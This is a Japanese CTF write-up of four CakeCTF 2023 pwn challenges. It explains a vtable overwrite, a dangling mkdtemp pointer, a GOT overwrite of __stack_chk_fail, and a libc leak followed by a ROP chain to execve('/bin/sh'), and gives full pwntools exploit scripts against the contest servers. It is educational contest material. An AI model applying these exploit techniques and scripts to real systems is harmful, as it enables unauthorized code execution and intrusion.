+++
title = "CakeCTF 2023"
date = 2023-11-13
description = "CTFを始めて1年が立ちました"
[taxonomies]
tags = ["pwn", "C++", "Buffer Overflow", "ROP"]
+++

CakeCTFにTPCとして参加しました。

<!-- more -->

# [pwn] vtable4b

## 分析

ncで問題サーバー接続すると下記のようなコードが実行されている旨のメッセージが表示されます。

```c
class Cowsay {
    public:
    Cowsay(char *message) : message_(message) {}
    char*& message() { return message_; }
    virtual void dialogue();

    private:
    char *message_;
};

void main() {
    Cowsay *cowsay = new Cowsay(new char[0x18]());
}
```

また、以下のように、実行できることとして2つの選択肢が表示されます。親切にwin関数のアドレスまで表示してくれています。

```
You can
 1. Call `dialogue` method:
  cowsay->dialogue();

 2. Set `message`:
  std::cin >> cowsay->message();

Last but not least, here is the address of `win` function which you should call to get the flag:
  <win> = 0x5619d82f761a

1. Use cowsay
2. Change message
3. Display heap
>
```

`Display heap`を使うとヒープメモリをきれいに表示してくれました。

```
  [ address ]    [ heap data ]
               +------------------+
0x5619d83d4ea0 | 0000000000000000 |
               +------------------+
0x5619d83d4ea8 | 0000000000000021 |
               +------------------+
0x5619d83d4eb0 | 0000000000000000 | <-- message (= '')
               +------------------+
0x5619d83d4eb8 | 0000000000000000 |
               +------------------+
0x5619d83d4ec0 | 0000000000000000 |
               +------------------+
0x5619d83d4ec8 | 0000000000000021 |
               +------------------+
0x5619d83d4ed0 | 00005619d82face8 | ---------------> vtable for Cowsay
               +------------------+                 +------------------+
0x5619d83d4ed8 | 00005619d83d4eb0 |  0x5619d82face8 | 00005619d82f76e2 |
               +------------------+                 +------------------+
0x5619d83d4ee0 | 0000000000000000 |                 --> Cowsay::dialogue
               +------------------+
0x5619d83d4ee8 | 000000000000f121 |
               +------------------+
```

## 攻撃

`Display heap`の内容を見ながら、`message`のBoFを用いてCowsayのvtableを書き換えてwin関数を呼び出せば良さそうです。

## スクリプト

```py
from pwn import *
import re

context.arch = "amd64"
context.bits = 64
context.terminal = "tmux splitw -h".split()
# context.log_level = "DEBUG"

s2sh = lambda pl: b"".join([p8(int(pl[i : i + 2], 16)) for i in range(0, len(pl), 2)])
s2u64 = lambda s: u64(s.ljust(8, b"\x00"))
i2b = lambda x: f"{x}".encode()
ptr_guard = lambda pos, ptr: (pos >> 12) ^ ptr


def create_io() -> tubes.tube.tube:
    if not local:
        io: tubes.tube.tube = remote(remote_addr, int(remote_port))
    elif debug:
        if radare:
            io: tubes.tube.tube = process(elf_name, env={"LD_PRELOAD": libc_name})
            util.proc.wait_for_debugger(util.proc.pidof(io)[0])
        else:
            io: tubes.tube.tube = gdb.debug(
                elf_name, script, env={"LD_PRELOAD": libc_name}
            )
    else:
        io: tubes.tube.tube = process(elf_name, env={"LD_PRELOAD": libc_name})
    return io


def solve():
    global t
    sa = lambda x, y: t.sendafter(x, y)
    sla = lambda x, y: t.sendlineafter(x, y)

    t.recvuntil(b"<win> = ")
    buf = t.recvline().strip()
    win = int(buf, 16)
    success(f'{win=:x}')
    sla(b"> ", i2b(3))
    buf = t.recvuntil(b"vtable for")
    addrs = re.findall(r"0x[0-9a-f]*ed0", buf.decode())
    assert len(addrs) == 1
    heap_addr = int(addrs[0].encode(), 16)
    success(f"{heap_addr=:x}")
    sla(b"> ", i2b(2))
    message = heap_addr - 0x20
    p_vtable = heap_addr - 0x18
    sla(
        b"> ",
        p64(win) * 3 + p64(0x21) + p64(p_vtable) + p64(message) + p64(0) + p64(0xF121),
    )

    t.interactive()


local = 0
debug = 1
radare = 0

elf_name = ""
libc_name = ""
remote_addr, remote_port = "vtable4b.2023.cakectf.com 9000".split()
# elf: ELF = ELF(elf_name)
# libc: ELF = ELF(libc_name)
script = """
"""
t = create_io()
solve()
```

# [pwn] memorial_cabbage

## 分析

`/tmp`配下にディレクトリを作成し、その中に`memo.txt`というファイルを作成します。
その後、ユーザーからの入力を受け取り`memo.txt`に書き込むという単純なメモアプリのようです。

`setup`関数の中で`mkdtemp`を呼び出している箇所に脆弱性があります。

```c
static char *tempdir;

void setup() {
  char template[] = TEMPDIR_TEMPLATE;
  ...
  if (!(tempdir = mkdtemp(template))) {
  ...
  }
```

`mkdtemp`
関数は引数に与えられた文字列ポインタのXXXXの部分をランダムに書き換えます。すなわち、上の処理ではスタック上に存在する`template`
変数を書き換えてスタックへのポインタを`tempdir`に保存しています。
したがって、setup関数から抜けた瞬間から`tempdir`が指している内容は変わる可能性があり、実際に`buf`変数に入力を与えることで書き換えが可能です。

## スクリプト

```py
from pwn import *

context.arch = "amd64"
context.bits = 64
context.terminal = "tmux splitw -h".split()
context.log_level = "DEBUG"

s2sh = lambda pl: b"".join([p8(int(pl[i : i + 2], 16)) for i in range(0, len(pl), 2)])
s2u64 = lambda s: u64(s.ljust(8, b"\x00"))
i2b = lambda x: f"{x}".encode()
ptr_guard = lambda pos, ptr: (pos >> 12) ^ ptr


def create_io() -> tubes.tube.tube:
    if not local:
        io: tubes.tube.tube = remote(remote_addr, int(remote_port))
    elif debug:
        if radare:
            io: tubes.tube.tube = process(elf_name, env={"LD_PRELOAD": libc_name})
            util.proc.wait_for_debugger(util.proc.pidof(io)[0])
        else:
            io: tubes.tube.tube = gdb.debug(
                elf_name, script, env={"LD_PRELOAD": libc_name}
            )
    else:
        io: tubes.tube.tube = process(elf_name, env={"LD_PRELOAD": libc_name})
    return io


def solve():
    global t
    sa = lambda x, y: t.sendafter(x, y)
    sla = lambda x, y: t.sendlineafter(x, y)

    sla(b">", i2b(1))
    sla(b":", b"A" * (0x1010 - 0x20) + b"/flag.txt\x00")

    t.interactive()


local = 0
debug = 0
radare = 0

elf_name = "./cabbage"
libc_name = ""
remote_addr, remote_port = "memorialcabbage.2023.cakectf.com 9001".split()
elf: ELF = ELF(elf_name)
# libc: ELF = ELF(libc_name)
script = """
"""
t = create_io()
solve()
```

# [pwn] bofww

## 分析

まずはセキュリティ機構を確認します。

```bash
RELRO:    Partial RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      No PIE (0x400000)
```

ソースコードを確認すると`input_person`関数にBoFがあります(`cin >> _name`の部分)。

```cpp
void win() {
  std::system("/bin/sh");
}

void input_person(int& age, std::string& name) {
  int _age;
  char _name[0x100];
  std::cout << "What is your first name? ";
  std::cin >> _name;
  std::cout << "How old are you? ";
  std::cin >> _age;
  name = _name;
  age = _age;
}

int main() {
  int age;
  std::string name;
  input_person(age, name);
  std::cout << "information:" << std::endl
            << "age: " << age << std::endl
            << "name: " << name << std::endl;
  return 0;
}
```

canaryが存在するため単純なROPはできません。

## 脆弱性

gdbで`name = _name`の処理を追ってみると以下のように、`name`変数が指し示す領域に`_name`の内容をコピーしていることがわかります。
(C++におけるstringの構造がわからない方は
[こちらの記事](https://ptr-yudai.hatenablog.com/entry/2021/11/30/235732)
を読むことをおすすめします。)

```
0x7ffff7ed7170 <_M_replace> call   memcpy@plt
        dest: 0x7fffffffea90 —▸ 0x7ffff7fb2f00 (std::wclog+128) ◂— 0x0
        src: 0x7fffffffe950 ◂— 0x44434241 /* 'ABCD' */
        n: 0x4
```

`name`変数はBoFで書き換えることができるので、これはすなわち任意書き込みができるということになります。(ただし、`strlen`
を用いて書き込む長さを計算しているため、"\x00"が出現するまでの内容しか書き込めないという制限はあります。)

## 攻撃

ARWプリミティブが得られたので`__stack_chk_fail`のGOTを`win`関数のアドレスに書き換えてあげればシェルを得ることができます。

## スクリプト

```py
from pwn import *

context.arch = "amd64"
context.bits = 64
context.terminal = "tmux splitw -h".split()
context.log_level = "DEBUG"

s2sh = lambda pl: b"".join([p8(int(pl[i : i + 2], 16)) for i in range(0, len(pl), 2)])
s2u64 = lambda s: u64(s.ljust(8, b"\x00"))
i2b = lambda x: f"{x}".encode()
ptr_guard = lambda pos, ptr: (pos >> 12) ^ ptr


def create_io() -> tubes.tube.tube:
    if not local:
        io: tubes.tube.tube = remote(remote_addr, int(remote_port))
    elif debug:
        if radare:
            io: tubes.tube.tube = process(elf_name, env={"LD_PRELOAD": libc_name})
            util.proc.wait_for_debugger(util.proc.pidof(io)[0])
        else:
            io: tubes.tube.tube = gdb.debug(
                elf_name, script, env={"LD_PRELOAD": libc_name}
            )
    else:
        io: tubes.tube.tube = process(elf_name, env={"LD_PRELOAD": libc_name})
    return io


def solve():
    global t
    sa = lambda x, y: t.sendafter(x, y)
    sla = lambda x, y: t.sendlineafter(x, y)

    got_canary = 0x404050
    win = 0x004012F6
    sla(b"name?", p64(win) + p64(got_canary) * 40)
    sla(b"you?", b"0")
    t.recv()

    t.interactive()


local = 0
debug = 1
radare = 0

elf_name = "./bofww"
libc_name = ""
remote_addr, remote_port = "bofww.2023.cakectf.com 9002".split()
# remote_addr, remote_port = "172.31.0.2 5000".split()
elf: ELF = ELF(elf_name)
# libc: ELF = ELF(libc_name)
script = """
"""
t = create_io()
solve()
```

# [pwn] bofwow

## 分析

bofwwから`win`関数がなくなりました。

## 攻撃

1. libc leak
2. ROP

の順で攻撃をします。

### libc leak

ARWプリミティブがありますが、アドレスに含まれる"\x00"が出てきた時点までしか書き込めないため、一回の任意書き込みだけではROPもlibc
leakもできません。
そこで、`main`関数を何度も呼び出すことを考えます。

`main`関数の中で、最後の方に`ostream::operator<<(ostream&)`
が呼び出されていることから、このGOTをmain関数のはじめに書き換えると`main`
関数が終了することなく無限ループできそうです。
(なお、stringのデストラクタはアドレスに`0x10`が入っているため書き換えができません。)

libc leakは`ostream::operator<<(int)`を利用します。
`__stack_chk_fail`の書き換えにより、canaryを無効化できるため、`rbp`を任意の値に設定することができます。
すなわち、`main`関数の以下の部分で任意のアドレスの内容が出力できます。
PIEが無効であることから、GOT領域を読み出すことでlibc leakを実現できます。

```asm
mov eax, dword [rbp-0x44]
mov esi, eax
call sym std::ostream::operator<<(int)
```

exploitでは`setbuf`関数のGOTを読み出しました。

```py
    # 低位アドレスの読み出し
    rop_stage = p64(elf.sym["main"]) + b"B" * 0x108 + got_setbuf_P44h
    rop1 = ret + p64(0x004013E0) * 2 + got_op_ostream_str * 3
    sla(b"name?", rop_stage + rop1)
    sla(b"you?", i2b(0))
    libc_l = int(t.recvline()) & 0xFFFFFFFF
    
    # 高位アドレスの読みだし
    rop_stage = p64(elf.sym["main"]) + b"B" * 0x108 + got_setbuf_P48h
    rop1 = ret + print_info.ljust(0x10, b"\x00") + got_op_ostream_str * 3
    sla(b"name?", rop_stage + rop1)
    sla(b"you?", i2b(0))
    libc_h = (int(t.recvline()) & 0xFFFFFFFF) << 32
```

### ROP

canaryが無効化され、libc leakができましたが、簡単にROPに持ち込むことはできません。
`input_person`関数にはstringが参照渡しされています。これは`input_person`
関数からretする際のstring領域の内容は`name = _name`の時点で上書きされることを意味します。

そのため、string領域をで読み飛ばしてあげる必要があります。
これには`pop rbx ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; pop rbp`というガジェットを用いました。

## スクリプト

```py
from pwn import *

context.arch = "amd64"
context.bits = 64
context.terminal = "tmux splitw -h".split()
context.log_level = "DEBUG"

s2sh = lambda pl: b"".join([p8(int(pl[i : i + 2], 16)) for i in range(0, len(pl), 2)])
s2u64 = lambda s: u64(s.ljust(8, b"\x00"))
i2b = lambda x: f"{x}".encode()
ptr_guard = lambda pos, ptr: (pos >> 12) ^ ptr


def create_io() -> tubes.tube.tube:
    if not local:
        io: tubes.tube.tube = remote(remote_addr, int(remote_port))
    elif debug:
        if radare:
            io: tubes.tube.tube = process(elf_name, env={"LD_PRELOAD": libc_name})
            util.proc.wait_for_debugger(util.proc.pidof(io)[0])
        else:
            io: tubes.tube.tube = gdb.debug(
                elf_name, script, env={"LD_PRELOAD": libc_name}
            )
    else:
        io: tubes.tube.tube = process(elf_name, env={"LD_PRELOAD": libc_name})
    return io


def solve():
    global t
    sa = lambda x, y: t.sendafter(x, y)
    sla = lambda x, y: t.sendlineafter(x, y)
    # ROP
    ## cannot send [0x9, 0xa, 0x10, 0x20]
    leave = p64(0x4013A3)
    dummy_rbp = p64(0x404048 + 0x110)
    ret = p64(0x40101A)

    got_stack_chk = p64(0x404048)
    got_op_ostream_str = p64(0x404030)
    got_setbuf_P44h = p64(0x404060 + 0x44)
    got_setbuf_P48h = p64(0x404060 + 0x48)
    print_info = p64(0x004013E0)

    rop_stage = leave + b"A" * 0x108 + dummy_rbp
    rop1 = p64(elf.sym["main"]) * 3 + got_stack_chk * 3
    sla(b"name?", rop_stage + rop1)
    sla(b"you?", i2b(0))

    rop_stage = p64(elf.sym["main"]) + b"B" * 0x108 + got_setbuf_P44h
    rop1 = ret + print_info.ljust(0x10, b"\x00") + got_op_ostream_str * 3
    sla(b"name?", rop_stage + rop1)
    sla(b"you?", i2b(0))
    t.recvuntil(b"Age: ")
    libc_l = int(t.recvline()) & 0xFFFFFFFF

    rop_stage = p64(elf.sym["main"]) + b"B" * 0x108 + got_setbuf_P48h
    rop1 = ret + print_info.ljust(0x10, b"\x00") + got_op_ostream_str * 3
    sla(b"name?", rop_stage + rop1)
    sla(b"you?", i2b(0))
    t.recvuntil(b"Age: ")
    libc_h = (int(t.recvline()) & 0xFFFFFFFF) << 32
    libc_base = libc_h + libc_l - 0x88060
    info(f"{libc_base=:x}")
    assert not libc_base & 0xFFF

    input("ready to exploit?")
    pop_6 = libc_base + 0x2A73D
    pop_rdi = libc_base + 0x2A3E5
    pop_rsi = libc_base + 0x2BE51
    pop_rax = libc_base + 0x119C85
    pop_rdx_r12 = libc_base + 0x11F497
    syscall = libc_base + 0x29DB4
    bin_sh = libc_base + 0x1D8698

    rop_stage = (
        p64(pop_6)
        + p64(pop_rax)
        + p64(59)
        + p64(pop_rdi)
        + p64(bin_sh)
        + p64(pop_rsi)
        + p64(0)
        + p64(pop_rdx_r12)
        + p64(0)
        + p64(0)
        + p64(syscall)
    )

    rop_stage = rop_stage.ljust(0x110, b"C") + dummy_rbp
    rop1 = b"".ljust(0x18, b"\x00") + got_stack_chk * 3
    sla(b"name?", rop_stage + rop1)
    sla(b"you?", i2b(0))

    t.interactive()


local = 0
debug = 0
radare = 0

elf_name = "./bofwow"
libc_name = "./libc.so.6"
remote_addr, remote_port = "bofwow.2023.cakectf.com 9003".split()
# remote_addr, remote_port = "172.17.0.3 5000".split()

elf: ELF = ELF(elf_name)
libc: ELF = ELF(libc_name)
script = """
b *0x40139e
"""
t = create_io()
solve()
```

# 終わりに

何度[ptr-yudaiさんの記事](https://ptr-yudai.hatenablog.com/entry/2021/11/30/235732)に命を救われたかわかりません。
全pwnerが一度は読むべきだと思っています。footnote芸もいつか真似できるようになりたいものです。